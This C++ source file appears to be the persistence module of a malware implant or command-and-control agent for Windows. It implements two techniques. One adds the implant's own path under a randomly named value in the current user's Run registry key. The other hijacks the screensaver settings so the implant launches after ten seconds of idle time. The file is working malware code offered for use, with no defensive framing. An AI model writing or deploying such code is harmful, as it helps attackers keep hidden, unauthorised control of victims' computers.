#include "core/task.hpp"

namespace Task
{
    std::wstring Persist(State::PSTATE pState, const std::wstring& wTechnique)
    {
        // Get current program (implant) path.
        WCHAR wSelfPath[MAX_PATH];
        DWORD dwResult = GetModuleFileNameW(NULL, wSelfPath, MAX_PATH);
        if (dwResult == 0)
        {
            return L"Error: Failed to get the program path.";
        }

        if (wcscmp(wTechnique.c_str(), L"runkey") == 0)
        {
            // Add an entry to Registry Run.
            HKEY hKey;
            std::wstring wSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            std::wstring wValue = Utils::Random::RandomString(8);
        
            LPCWSTR lpData = wSelfPath;

            LONG result = RegOpenKeyExW(
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                0,
                KEY_SET_VALUE,
                &hKey
            );
            if (result != ERROR_SUCCESS)
                return L"Error: Failed to open key.";
           
            result = RegSetValueExW(
                hKey,
                wValue.c_str(),
                0,
                REG_SZ,
                (BYTE*)lpData,
                (wcslen(lpData) + 1) * sizeof(WCHAR)
            );
            RegCloseKey(hKey);

            if (result == ERROR_SUCCESS)
                return L"Success: The entry has been set to HKCU\\" + wSubKey + L".";
            else
                return L"Error: Failed to set value to registry.";
        }
        else if (wcscmp(wTechnique.c_str(), L"screensaver") == 0)
        {
            // Write entries for screensaver.
            // Reference: https://cocomelonc.github.io/tutorial/2022/04/26/malware-pers-2.html
            HKEY hKey;
            std::wstring wSubKey = L"Control Panel\\Desktop";
            const WCHAR* wActivate = L"1"; // 1 => Activate
            const WCHAR* wTimeOut = L"10";

            if (RegOpenKeyExW(
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                0,
                KEY_WRITE,
                &hKey
            ) != ERROR_SUCCESS)
            {
                return L"Error: Failed to open key.";
            }
        
            // Create new registry keys.
            if (RegSetValueExW(
                hKey,
                L"ScreenSaveActive",
                0,
                REG_SZ,
                (BYTE*)wActivate,
                (wcslen(wActivate) + 1) * sizeof(WCHAR)
            ) != ERROR_SUCCESS)
            {
                RegCloseKey(hKey);
                return L"Error: Failed to set value to registry.";
            }

            if (RegSetValueExW(
                hKey,
                L"ScreenSaveTimeOut",
                0,
                REG_SZ,
                (BYTE*)wTimeOut,
                (wcslen(wTimeOut) + 1) * sizeof(WCHAR)
            ) != ERROR_SUCCESS)
            {
                RegCloseKey(hKey);
                return L"Error: Failed to set value to registry.";
            }

            if (RegSetValueExW(
                hKey,
                L"SCRNSAVE.EXE",
                0,
                REG_SZ,
                (BYTE*)wSelfPath,
                (wcslen(wSelfPath) + 1) * sizeof(WCHAR)
            ) != ERROR_SUCCESS)
            {
                RegCloseKey(hKey);
                return L"Error: Failed to set value to registry.";
            }

            RegCloseKey(hKey);
            return L"Success: The entry has been set to HKCU\\" + wSubKey + L".";
        }
        else
        {
            return L"Not implemented yet.";
        }
    }
}